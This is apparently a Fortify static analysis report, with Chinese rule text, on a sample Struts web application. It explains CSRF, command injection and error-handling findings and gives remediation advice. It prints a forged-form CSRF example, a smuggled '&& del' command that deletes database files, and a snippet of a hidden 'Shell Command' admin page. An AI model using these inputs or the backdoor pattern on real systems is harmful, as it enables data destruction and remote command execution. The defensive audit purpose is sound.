                                <Value>PerformRegistration.jsp 第 23 行中的表单发布必须包含用户特有的机密，防止攻击者发出未经授权的请求。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>跨站点伪装请求 (CSRF) 漏洞会在以下情况下发生：
1. Web 应用程序使用会话 cookie。

2. 应用程序未验证请求是否经过用户同意便处理 HTTP 请求。



Nonce 是随消息一起发送的加密随机值，可防止 replay 攻击。如果该请求未包含证明其来源的 nonce，则处理该请求的代码将易受到 CSRF 攻击（除非它并未更改应用程序的状态）。这意味着使用会话 cookie 的 Web 应用程序必须采取特殊的预防措施，确保攻击者无法诱骗用户提交伪请求。假设有一个 Web 应用程序，它允许管理员通过提交此表单来创建新帐户：


&lt;form method="POST" action="/new_user" &gt;
  Name of new user: &lt;input type="text" name="username"&gt;
  Password for new user: &lt;input type="password" name="user_passwd"&gt;
    &lt;input type="submit" name="action" value="Create User"&gt;
&lt;/form&gt;


攻击者可能会使用以下内容来建立一个网站：


&lt;form method="POST" action="http://www.example.com/new_user"&gt;
  &lt;input type="hidden" name="username" value="hacker"&gt;
  &lt;input type="hidden" name="user_passwd" value="hacked"&gt;
&lt;/form&gt;
&lt;script&gt;
  document.usr_form.submit();
&lt;/script&gt;


如果 example.com 的管理员在网站上具有活动会话时访问了恶意页面，则会在毫不知情的情况下为攻击者创建一个帐户。这就是 CSRF 攻击。正是由于该应用程序无法确定请求的来源，才有可能受到 CSRF 攻击。任何请求都有可能是用户选定的合法操作，也有可能是攻击者设置的伪操作。攻击者无法查看伪请求生成的网页，因此，这种攻击技术仅适用于篡改应用程序状态的请求。

如果应用程序通过 URL 传递会话标识符（而不是 cookie），则不会出现 CSRF 问题，因为攻击者无法访问会话标识符，也无法在伪请求中包含会话标识符。

CSRF 在 2007 OWASP Top 10 排行榜上名列第 5。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>使用会话 Cookie 的应用程序必须在每个表单发布中包含几条信息，以便后端代码可以用来验证请求的来源。为此，其中一种方法就是使用一个随机请求标识符或随机数，如下所示：


  RequestBuilder rb = new RequestBuilder(RequestBuilder.POST, "/new_user");
  body = addToPost(body, new_username);
  body = addToPost(body, new_passwd);
  body = addToPost(body, request_id);
  rb.sendRequest(body, new NewAccountCallback(callback));


这样，后端逻辑可先验证请求标识符，然后再处理其他表单数据。如果可能，每个服务器请求的请求标识符都应该是唯一的，而不是在特定会话的各个请求之间共享。对于会话标识符而言，攻击者越难猜出请求标识符，则越难成功进行 CSRF 攻击。标记不应能够轻松猜出，它应以保护会话标记相同的方法得到保护，例如使用 SSLv3。

其他缓解技术还包括：

框架保护：大多数现代化的 Web 应用框架都嵌入了 CSRF 保护，它们将自动包含并验证 CSRF 标记。
使用质询-响应控制：强制客户响应由服务器发送的质询是应对 CSRF 的强有力防御方法。可以用于此目的的一些质询如下：CAPTCHA、密码重新验证和一次性标记。
检查 HTTP Referer/原始标题：攻击者在执行 CSRF 攻击时无法冒仿这些标题。这使这些标题可以用于预防 CSRF 攻击。
再次提交会话 Cookie：除了实际的会话 ID Cookie 外，将会话 ID Cookie 作为隐藏表单值发送是预防 CSRF 攻击的有效防护方法。服务器在处理其余表单数据之前，会先检查这些值，以确保它们完全相同。如果攻击者代表用户提交表单，他将无法根据同源策略修改会话 ID Cookie 值。
限制会话的有效期：当通过 CSRF 攻击访问受保护的资源时，只有当作为攻击一部分发送的会话 ID 在服务器上仍然有效时，攻击才会生效。限制会话的有效期将降低攻击成功的可能性。

这里所描述的技术可以使用 XSS 攻击破解。有效的 CSRF 缓解包括 XSS 缓解技术。
</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. Fortify Static Code Analyzer（Fortify 静态代码分析器）会标记可能执行 POST 操作的所有 HTML 表单和 XMLHttpRequest 对象。审计员必须确定每个表单是否值得攻击者将其作为 CSRF 目标，以及是否采取了适当的缓解措施。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>21</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="9E042E1E6C6ACB4F68700B69F9B5CC54" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Register.jsp 第 77 行中的表单发布必须包含用户特有的机密，防止攻击者发出未经授权的请求。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>Register.jsp</FileName>
                                <FilePath>login/Register.jsp</FilePath>
                                <LineStart>77</LineStart>
                                <Snippet>
                        &lt;table cellpadding="0" cellspacing="0" border="0" align="left" id="right" valign="top"&gt;
                        	&lt;s:form action="PerformRegistration" method="POST" theme="simple"&gt;
                                &lt;tr valign="middle"&gt;
                                    &lt;br/&gt;&lt;br/&gt;&lt;br/&gt;</Snippet>
                                <TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AFEE5251770073188D506979DB38705E" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>PerformRegistration.jsp 第 23 行中的表单发布必须包含用户特有的机密，防止攻击者发出未经授权的请求。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>PerformRegistration.jsp</FileName>
                                <FilePath>login/PerformRegistration.jsp</FilePath>
                                <LineStart>23</LineStart>
                                <Snippet>					&lt;td id="utilities" align="right"&gt;&lt;a &gt;Find Locations&lt;/a&gt; | &lt;a &gt;Contact Us&lt;/a&gt; | &lt;a &gt;Site Map&lt;/a&gt;&amp;nbsp;&lt;/td&gt;
					&lt;td id="search" align="right" &gt;
                        &lt;form id="search" action="" method="get" &gt;
							&lt;input type="text" size="28" maxlength="75" name="query" id="searchbox" title="Search" height="24" align="absmiddle" /&gt;
							&lt;input type="image" src="&lt;s:url value="/img/btn_search_white.gif" includeParams="none"/&gt;" alt="Search" name="searchBtn" id="searchbtn"  align="absmiddle" disabled/&gt;</Snippet>
                                <TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AFEE5251770073188D506979DB38705F" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>PerformRegistration.jsp 第 81 行中的表单发布必须包含用户特有的机密，防止攻击者发出未经授权的请求。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>PerformRegistration.jsp</FileName>
                                <FilePath>login/PerformRegistration.jsp</FilePath>
                                <LineStart>81</LineStart>
                                <Snippet>                            &lt;tr&gt;
                                &lt;td align="center" valign="top"&gt;
                                    &lt;s:form action="%{button}" method="GET"&gt;

                                        &lt;c:choose&gt;</Snippet>
                                <TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9E042E1E6C6ACB4F68700B69F9B5CC53" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Register.jsp 第 23 行中的表单发布必须包含用户特有的机密，防止攻击者发出未经授权的请求。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>Register.jsp</FileName>
                                <FilePath>login/Register.jsp</FilePath>
                                <LineStart>23</LineStart>
                                <Snippet>					&lt;td id="utilities" align="right"&gt;&lt;a &gt;Find Locations&lt;/a&gt; | &lt;a &gt;Contact Us&lt;/a&gt; | &lt;a &gt;Site Map&lt;/a&gt;&amp;nbsp;&lt;/td&gt;
					&lt;td id="search" align="right" &gt;
                        &lt;form id="search" action="" method="get" &gt;
							&lt;input type="text" size="28" maxlength="75" name="query" id="searchbox" title="Search" height="24" align="absmiddle" /&gt;
							&lt;input type="image" src="&lt;s:url value="/img/btn_search_white.gif" includeParams="none"/&gt;" alt="Search" name="searchBtn" id="searchbtn"  align="absmiddle" disabled/&gt;</Snippet>
                                <TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7B3A7AF46D1BDFCF1C75CC9F4ED431D4" ruleID="78E0700E-56FE-45A2-A11B-6A560F730576">
                            <Category>Cross-Site Request Forgery</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>hidden_AdminControl.jsp 第 1 行中的表单发布必须包含用户特有的机密，防止攻击者发出未经授权的请求。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>hidden_AdminControl.jsp</FileName>
                                <FilePath>pages/common/hidden_AdminControl.jsp</FilePath>
                                <LineStart>1</LineStart>
                                <Snippet>&lt;form method=get action='hidden_AdminControl.jsp'&gt;
Shell Command&lt;br /&gt;
&lt;input name='actions' type=text size="80"&gt;&lt;br/&gt;</Snippet>
                                <TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="21">
                        <groupTitle>Poor Error Handling: Throw Inside Finally</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>使用 finally 块中的 throw 语句会通过 try-catch-finally 破坏逻辑进度。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>在 Java 中，finally 块通常在其相应的 try-catch 块之后执行，该块通常用于自由分配的资源，例如文件句柄或数据库指针。由于破坏了正常的程序执行，在 finally 块中抛出异常会绕过关键的清除代码。

例 1：在下列代码中，抛出 FileNotFoundException 时，将绕过对 stmt.close() 的调用。

public void processTransaction(Connection conn) throws FileNotFoundException
{
    FileInputStream fis = null;
    Statement stmt = null;
    try
    {
        stmt = conn.createStatement();
        fis = new FileInputStream("badFile.txt");
        ...
    }
    catch (FileNotFoundException fe)
    {
        log("File not found.");
    }
    catch (SQLException se)
    {
        //handle error
    }
    finally
    {
        if (fis == null)
        {
            throw new FileNotFoundException();
        }

        if (stmt != null)
        {
            try
            {
                stmt.close();
            }
            catch (SQLException e)
            {
                log(e);
            }
        }
    }
}
&#xD;
此类别来源于 Cigital Java Rulepack。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>请勿从 finally 块中抛出异常。如果您必须重新抛出异常，请在 catch 块中执行该操作，这样不会影响到 finally 块的正常执行。
例 2：下列代码会在 catch 块中重新抛出 FileNotFoundException。

public void processTransaction(Connection conn) throws FileNotFoundException
{
    FileInputStream fis = null;
    Statement stmt = null;
    try
    {
        stmt = conn.createStatement();
        fis = new FileInputStream("badFile.txt");
        ...
    }
    catch (FileNotFoundException fe)
    {
        log("File not found.");
        throw fe;
    }
    catch (SQLException se)
    {
        //handle error
    }
    finally
    {
        if (fis != null)
        {
            try
            {
                fis.close();
            }
            catch (IOException ie)
            {
                log(ie);
            }
        }

        if (stmt != null)
        {
            try
            {
                stmt.close();
            }
            catch (SQLException e)
            {
                log(e);
            }
        }
    }
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>21</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="001E1E1C836A7411BE22538063CA4B13" ruleID="1F50410E-C148-415D-94A1-38D911C45919">
                            <Category>Poor Error Handling: Throw Inside Finally</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>使用 finally 块中的 throw 语句会通过 try-catch-finally 破坏逻辑进度。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>85</LineStart>
                                <Snippet>        }
        finally
        {
            if (session != null)
                session.close();</Snippet>
                                <TargetFunction>FinallyBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F5CBAD0E9C7CBA7CFC07BA169D734F6F" ruleID="1F50410E-C148-415D-94A1-38D911C45919">
                            <Category>Poor Error Handling: Throw Inside Finally</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>使用 finally 块中的 throw 语句会通过 try-catch-finally 破坏逻辑进度。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>42</LineStart>
                                <Snippet>        }
        finally
        {
            if (session != null)
                session.close();</Snippet>
                                <TargetFunction>FinallyBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1AE1F56ED631924F37FEC1DBB06955C1" ruleID="1F50410E-C148-415D-94A1-38D911C45919">
                            <Category>Poor Error Handling: Throw Inside Finally</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>使用 finally 块中的 throw 语句会通过 try-catch-finally 破坏逻辑进度。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>63</LineStart>
                                <Snippet>        }
        finally
        {
            if (session != null)
                session.close();</Snippet>
                                <TargetFunction>FinallyBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E992F47DB9AEC9E4C9FAAC8A4E48263D" ruleID="1F50410E-C148-415D-94A1-38D911C45919">
                            <Category>Poor Error Handling: Throw Inside Finally</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>使用 finally 块中的 throw 语句会通过 try-catch-finally 破坏逻辑进度。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>124</LineStart>
                                <Snippet>        }
        finally
        {
            if (session != null)
                session.close();</Snippet>
                                <TargetFunction>FinallyBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7679EF29E1F68CB71BFF9742E7AB50FF" ruleID="1F50410E-C148-415D-94A1-38D911C45919">
                            <Category>Poor Error Handling: Throw Inside Finally</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>使用 finally 块中的 throw 语句会通过 try-catch-finally 破坏逻辑进度。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountService.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/model/AccountService.java</FilePath>
                                <LineStart>172</LineStart>
                                <Snippet>        }
        finally
        {
            if (session != null)
                session.close();</Snippet>
                                <TargetFunction>FinallyBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="21">
                        <groupTitle>Struts 2: Unvalidated Action</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>Struts2 Actions 应利用 Struts Validation 框架防止未经检验的输入产生漏洞。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>在 J2EE 应用程序中，未经检验的输入是导致漏洞发生的首要原因。未经校验的输入会导致出现各种漏洞，包括 Cross-Site Scripting、Process Control 和 SQL Injection。虽然 J2EE 应用程序通常情况下不容易受到 Memory Corruption 攻击的影响，但是如果 J2EE 应用程序连接到未执行数组边界检查的本地代码，攻击者就可能会利用 J2EE 应用程序中的某个输入校验错误发起 Buffer Overflow 攻击。

为了防止此类攻击，我们应在应用程序处理输入之前，使用 Struts Validation 框架来检验所有的程序输入。使用 Fortify Static Code Analyzer（Fortify 静态代码分析器）来确保您的 Struts Validator 配置中不存在任何漏洞。

验证器在例子中的用法包括检查并确保以下内容：

- 在电话号码字段中只包含有效字符

- 布尔值仅为“T”或者“F”

- 未限定格式的字符串必须具有合理的长度，并且由有效的字符组成</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>为对应的 Action（操作）定义 Struts Validator。以下示例说明了一种典型的“ActionClass-validation.xml”设置：

&lt;validators&gt;
  &lt;field name="user.firstName"&gt;
    &lt;field-validator type="requiredstring"&gt;
      &lt;message key="user.firstName.empty"/&gt;
    &lt;/field-validator&gt;
  &lt;/field&gt;
...

配置文件 ActionClass-validation.xml 包含了对验证函数（称为验证器）的定义。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 尽管我们有可能创建一个像 Struts Validation 框架那样全面的自定义输入验证系统，但是这种做法很容易产生错误。如果没有一种方法可以自动核实所有的输入字段是否经过验证，那么某些字段很有可能无法进行适当的验证。不要接受其他的验证方法来代替 Struts Validator，除非有一种自动方法，来确保替代框架能够验证所有操作中的所有字段。无论在应用程序的开发阶段还是将来的维护和增强阶段，都需要考虑该应用程序的输入验证机制是否正确和完整。

2. Struts Validation 框架是输入验证机制必不可少的组成部分，但是仅仅有它也是不够的。这是因为 Struts validation 只是在数据到达服务器后开始执行验证，而通常应用程序上下文并不能很好地区分有效输入和无效输入。例如，一个购物卡应用程序可以使用 Struts Validator 来验证数量字段是否总为正数，但是它并不能确定一个攻击者是否试图违反“一家一件”这个原则而购买多件打折物品。为此，该应用程序必须将附加验证作为业务逻辑的一部分。

3. Struts Validator 对于检查 GET 和 POST 参数值非常有帮助，但是不具有检查 cookie 和其他 HTTP 头文件的功能。所以要特别小心地验证那些来自 cookie 和其他 HTTP 头文件的名称和值信息。

4. 客户端的验证功能能够提高应用程序的可用性，但若考虑到系统安全性，这种做法并不恰当，因为攻击者可以很容易地绕过客户端的检查。Struts Validator 也可以用来进行客户端的验证，但是这种验证并不能替代服务器端针对所有输入数据的验证。</Value>
                            </MetaInfo>
                            <AttributeValue>
                                <Name>&lt;Unaudited&gt;</Name>
                                <Count>21</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Not an Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Reliability Issue</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Bad Practice</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Suspicious</Name>
                                <Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
                                <Name>Exploitable</Name>
                                <Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="E261EDB2D9B10D11405D145CA54BEF73" ruleID="3390C469-E9A2-46F9-9323-469AD3096AE7">
                            <Category>Struts 2: Unvalidated Action</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Struts2 Actions 应利用 Struts Validation 框架防止未经检验的输入产生漏洞。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>DeleteMessage.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/DeleteMessage.java</FilePath>
                                <LineStart>10</LineStart>
                                <Snippet>import org.apache.struts2.ServletActionContext;

public class DeleteMessage extends ActionSupport {
    public String execute() throws Exception {
</Snippet>
                                <TargetFunction>Class: DeleteMessage()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F8332E9919DB443320AE2C783DEAA797" ruleID="3390C469-E9A2-46F9-9323-469AD3096AE7">
                            <Category>Struts 2: Unvalidated Action</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Struts2 Actions 应利用 Struts Validation 框架防止未经检验的输入产生漏洞。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountSummary.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/AccountSummary.java</FilePath>
                                <LineStart>12</LineStart>
                                <Snippet>import com.fortify.samples.riches.model.Profile;

public class AccountSummary extends AdminSupport
{
    private String name;</Snippet>
                                <TargetFunction>Class: AccountSummary()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2F15FCDE860D85629C22BA591331CDF6" ruleID="3390C469-E9A2-46F9-9323-469AD3096AE7">
                            <Category>Struts 2: Unvalidated Action</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Struts2 Actions 应利用 Struts Validation 框架防止未经检验的输入产生漏洞。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AdminSupport.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/AdminSupport.java</FilePath>
                                <LineStart>14</LineStart>
                                <Snippet>import javax.servlet.http.Cookie;

public class AdminSupport extends ActionSupport
{
    private boolean auth;</Snippet>
                                <TargetFunction>Class: AdminSupport()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A9A08C8F5A8308427DA94A7E75C51C5F" ruleID="3390C469-E9A2-46F9-9323-469AD3096AE7">
                            <Category>Struts 2: Unvalidated Action</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Struts2 Actions 应利用 Struts Validation 框架防止未经检验的输入产生漏洞。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>AccountDetails.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/AccountDetails.java</FilePath>
                                <LineStart>24</LineStart>
                                <Snippet> * To change this template use File | Settings | File Templates.
 */
public class AccountDetails extends ActionSupport
{
	private String name;</Snippet>
                                <TargetFunction>Class: AccountDetails()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E4E029FB66A5632E8150237A7E2B639E" ruleID="3390C469-E9A2-46F9-9323-469AD3096AE7">
                            <Category>Struts 2: Unvalidated Action</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Struts2 Actions 应利用 Struts Validation 框架防止未经检验的输入产生漏洞。</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
                                <FileName>Check.java</FileName>
                                <FilePath>WEB-INF/src/java/com/fortify/samples/riches/Check.java</FilePath>
                                <LineStart>18</LineStart>
                                <Snippet>import java.util.List;

public class Check extends AdminSupport
{
    private String account;</Snippet>
                                <TargetFunction>Class: Check()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="18">
                        <groupTitle>Command Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
                                <Name>Abstract</Name>
                                <Value>hidden_AdminControl.jsp 中的 _jspService() 方法会利用由不可信赖的数据构建的命令来调用 exec()。这种调用会导致程序以攻击者的名义执行恶意命令。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Explanation</Name>
                                <Value>Command Injection 漏洞主要表现为以下两种形式：

－ 攻击者能够篡改程序执行的命令：攻击者直接控制了所执行的命令。

－ 攻击者能够篡改命令的执行环境：攻击者间接地控制了所执行的命令。

在这种情况下，我们着重关注第一种情况，即攻击者有可能控制所执行命令。这种类型的 Command Injection 漏洞会在以下情况下出现：

1. 数据从不可信赖的数据源进入应用程序。


2. 数据被用作代表应用程序所执行命令的字符串，或字符串的一部分。

3. 通过命令的执行，应用程序会授予攻击者一种原本不该拥有的特权或能力。

例 1：下面这段来自系统实用程序的代码根据系统属性 APPHOME 来决定其安装目录，然后根据指定目录的相对路径执行一个初始化脚本。


	...
	String home = System.getProperty("APPHOME");
	String cmd = home + INITCMD;
	java.lang.Runtime.getRuntime().exec(cmd);
	...


Example 1 中的代码可以使攻击者通过修改系统属性 APPHOME 以指向包含恶意版本 INITCMD 的其他路径来提高自己在应用程序中的权限，继而随心所欲地执行命令。由于程序不会验证从环境中读取的值，因此如果攻击者能够控制系统属性 APPHOME 的值，他们就能欺骗应用程序去运行恶意代码，从而取得系统控制权。

例 2：下面的代码来自一个管理 Web 应用程序，旨在使用户能够使用一个围绕 rman 实用程序的批处理文件封装器来启动 Oracle 数据库备份，然后运行一个 cleanup.bat 脚本来删除一些临时文件。脚本 rmanDB.bat 接受单个命令行参数，该参数指定了要执行的备份类型。由于访问数据库受限，所以应用程序执行备份需要具有较高权限的用户。


...
String btype = request.getParameter("backuptype");
String cmd = new String("cmd.exe /K
\"c:\\util\\rmanDB.bat "+btype+"&amp;&amp;c:\\util\\cleanup.bat\"")
System.Runtime.getRuntime().exec(cmd);
...


这里的问题是：程序没有对读取自用户的 backuptype参数进行任何验证。通常情况下 Runtime.exec() 函数不会执行多条命令，但在这种情况下，程序会首先运行 cmd.exe shell，从而可以通过调用一次 Runtime.exec() 来执行多条命令。在调用该 shell 之后，它即会允许执行用两个与号分隔的多条命令。如果攻击者传递了一个形式为 "&amp;&amp; del c:\\dbms\\*.*" 的字符串，那么应用程序将随程序指定的其他命令一起执行此命令。由于该应用程序的特性，运行该应用程序需要具备与数据库进行交互所需的权限，这就意味着攻击者注入的任何命令都将通过这些权限得以运行。

示例 3：下面的代码来自一个 Web 应用程序，用户可通过该应用程序提供的界面在系统上更新他们的密码。在某些网络环境中更新密码时，其中的一个步骤就是在 /var/yp 目录中运行 make 命令。


...
System.Runtime.getRuntime().exec("make");
...


这里的问题在于程序没有在它的构造中指定一个绝对路径，并且没能在执行 Runtime.exec() 调用前清除它的环境变量。如果攻击者能够修改 $PATH 变量，把它指向名为 make 恶意二进制代码，程序就会在其指定的环境下执行，然后加载该恶意二进制代码，而非原本期望的代码。由于应用程序自身的特性，运行该应用程序需要具备执行系统操作所需的权限，这意味着攻击者会利用这些权限执行自己的 make，从而可能导致攻击者完全控制系统。

有些人认为在移动世界中，典型的漏洞（如 Command Injection）是无意义的 -- 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。

例 4：以下代码可从 Android Intent 中读取要执行的命令。


...
        String[] cmds = this.getIntent().getStringArrayExtra("commands");
        Process p = Runtime.getRuntime().exec("su");
        DataOutputStream os = new DataOutputStream(p.getOutputStream());
        for (String cmd : cmds) {
                os.writeBytes(cmd+"\n");
        }
        os.writeBytes("exit\n");
        os.flush();
...


在经过 root 的设备上，恶意应用程序会强迫受攻击应用程序使用超级用户权限执行任意命令。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Recommendations</Name>
                                <Value>应当禁止用户直接控制由程序执行的命令。在用户的输入会影响命令执行的情况下，应将用户输入限制为从预定的安全命令集合中进行选择。如果输入中出现了恶意的内容，传递到命令执行函数的值将默认从安全命令集合中选择，或者程序将拒绝执行任何命令。

在需要将用户的输入用作程序命令中的参数时，由于合法的参数集合实在很大，或是难以跟踪，使得这个方法通常都不切实际。开发者通常的做法是使用黑名单。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何一个定义不安全内容的列表都很可能是不完整的，并且会严重地依赖于执行命令的环境。更好的方法是创建一份白名单，允许其中的字符出现在输入中，并且只接受完全由这些经认可的字符组成的输入。

攻击者可以通过修改程序运行命令的环境来间接控制这些命令的执行。我们不应当完全信赖环境，还需采取预防措施，防止攻击者利用某些控制环境的手段进行攻击。无论何时，只要有可能，都应由应用程序来控制命令，并使用绝对路径执行命令。如果编译时尚不了解路径（如在跨平台应用程序中），应该在执行过程中利用可信赖的值构建一个绝对路径。应对照一系列定义有效值的常量，仔细地检查从配置文件或者环境中读取的命令值和路径。

有时还可以执行其他检验，以检查这些来源是否已被恶意篡改。例如，如果一个配置文件为可写，程序可能会拒绝运行。如果能够预先得知有关要执行的二进制代码的信息，程序就会进行检测，以检验这个二进制代码的合法性。如果一个二进制代码始终属于某个特定的用户，或者被指定了一组特定的访问权限，这些属性就会在执行二进制代码前通过程序进行检验。

尽管可能无法完全阻止强大的攻击者为了控制程序执行的命令而对系统进行的攻击，但只要程序执行外部命令，就务必使用最小授权原则：不给予超过执行该命令所必需的权限。</Value>
                            </MetaInfo>
                            <MetaInfo>
                                <Name>Tips</Name>
                                <Value>1. 许多现代 Web 框架都会提供对用户输入执行验证的机制（包括 Struts 和 Spring MVC）。为了突出显示未经验证的输入源，Fortify 安全编码规则包会对 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题动态重新调整优先级，即在采用框架验证机制时降低这些问题被利用的几率并提供指向相应证据的指针。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队开发了 Data Validation（数据验证）项目模板，该模板根据应用于输入源的验证机制按文件夹对问题进行了分组。

2. Fortify RTA adds protection against this category.</Value>
